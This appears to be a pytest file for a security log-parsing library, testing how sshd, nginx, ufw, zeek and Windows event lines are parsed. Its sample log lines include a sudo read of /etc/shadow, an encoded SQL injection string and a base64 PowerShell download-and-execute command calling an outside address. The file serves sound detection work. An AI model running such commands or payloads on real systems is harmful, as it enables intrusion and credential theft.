"""Parsers are tested against literal log lines, not simulator output, so a
bug in the simulator cannot hide a bug in a parser."""
from sentinel.parsers import parse_line, parser_for_file


def test_sshd_failed_password_for_invalid_user():
    e = parse_line("sshd", "Sep 18 14:02:11 bastion-01 sshd[2211]: Failed password for "
                           "invalid user admin from 203.0.113.45 port 51122 ssh2")
    assert (e.action, e.outcome, e.user, e.src_ip, e.host) == (
        "ssh_login", "failure", "admin", "203.0.113.45", "bastion-01")
    assert e.extra["invalid_user"] is True
    assert e.timestamp == "2026-09-18T14:02:11Z"


def test_sshd_accepted_publickey():
    e = parse_line("sshd", "Sep  3 09:00:01 bastion-01 sshd[99]: Accepted publickey for "
                           "deploy from 100.64.1.2 port 50022 ssh2")
    assert (e.outcome, e.user, e.extra["auth_method"]) == ("success", "deploy", "publickey")
    assert e.timestamp.startswith("2026-09-03")      # single-digit day with padding


def test_sudo_and_useradd():
    e = parse_line("sshd", "Sep 18 14:05:00 web-01 sudo:   deploy : TTY=pts/0 ; "
                           "PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow")
    assert e.action == "sudo_command" and e.extra["command_line"] == "/usr/bin/cat /etc/shadow"
    e = parse_line("sshd", "Sep 18 14:06:00 web-01 useradd[3001]: new user: name=svc_backup, "
                           "UID=1002, GID=1002, home=/home/svc_backup, shell=/bin/bash")
    assert (e.action, e.user) == ("user_created", "svc_backup")


def test_nginx_decodes_double_url_encoding():
    e = parse_line("nginx", '203.0.113.9 - - [18/Sep/2026:14:02:11 +0000] '
                            '"GET /item?id=1%2527%2520OR%2520%25271%2527%253D%25271 HTTP/1.1" '
                            '200 512 "-" "sqlmap/1.8"')
    assert e.extra["url_decoded"] == "/item?id=1' OR '1'='1"
    assert e.extra["status"] == 200 and e.src_ip == "203.0.113.9"


def test_nginx_respects_timezone_offset():
    a = parse_line("nginx", '1.2.3.4 - - [18/Sep/2026:14:00:00 +0000] "GET / HTTP/1.1" 200 1 "-" "x"')
    b = parse_line("nginx", '1.2.3.4 - - [18/Sep/2026:16:00:00 +0200] "GET / HTTP/1.1" 200 1 "-" "x"')
    assert a.ts == b.ts


def test_ufw_block():
    e = parse_line("ufw", "Sep 18 14:02:11 fw-01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00 "
                          "SRC=198.51.100.23 DST=10.0.1.5 LEN=60 PROTO=TCP SPT=44321 DPT=3389 SYN")
    assert (e.action, e.src_ip, e.dst_ip, e.dst_port) == (
        "fw_block", "198.51.100.23", "10.0.1.5", 3389)


def test_zeek_flow():
    e = parse_line("zeek", '{"ts": 1789000000.5, "id.orig_h": "10.0.5.14", "id.resp_h": '
                           '"198.51.100.150", "id.resp_p": 443, "proto": "tcp", '
                           '"orig_bytes": 1288490188, "resp_bytes": 100, "duration": 412.0}')
    assert e.action == "network_flow" and e.extra["bytes_out"] == 1288490188
    assert e.extra["mb_out"] == 1288.5


def test_windows_process_start_decodes_powershell():
    import base64
    blob = base64.b64encode("IEX (iwr http://203.0.113.200/a)".encode("utf-16-le")).decode()
    line = ('{"@timestamp": "2026-09-18T14:00:00.000Z", "winlog": {"event_id": 4688, '
            '"computer_name": "WS-014", "event_data": {"SubjectUserName": "mlopez", '
            '"NewProcessName": "C:\\\\Windows\\\\System32\\\\powershell.exe", '
            '"ParentProcessName": "C:\\\\Office16\\\\WINWORD.EXE", '
            '"CommandLine": "powershell.exe -enc %s"}}}' % blob)
    e = parse_line("windows", line)
    assert e.extra["process_name"] == "powershell.exe"
    assert e.extra["parent_process"] == "winword.exe"
    assert e.extra["decoded_command"] == "IEX (iwr http://203.0.113.200/a)"


def test_windows_4732_target_is_the_group_not_the_user():
    line = ('{"@timestamp": "2026-09-18T14:00:00Z", "winlog": {"event_id": 4732, '
            '"computer_name": "WS-014", "event_data": {"TargetUserName": "Administrators", '
            '"MemberName": "WS-014\\\\helpdesk_svc", "SubjectUserName": "mlopez"}}}')
    e = parse_line("windows", line)
    assert (e.user, e.extra["group_name"], e.extra["actor"]) == (
        "helpdesk_svc", "Administrators", "mlopez")


def test_garbage_never_raises():
    for source in ("sshd", "nginx", "ufw", "zeek", "windows"):
        for junk in ("", "   ", "not a log line", "{broken json", "\x00\xff\x00", "{}",
                     '{"winlog": {"event_id": "abc"}}', "A" * 100000):
            assert parse_line(source, junk) is None


def test_file_hints():
    assert parser_for_file("samples/auth.log") == "sshd"
    assert parser_for_file("winevent.jsonl") == "windows"
    assert parser_for_file("notes.txt") is None
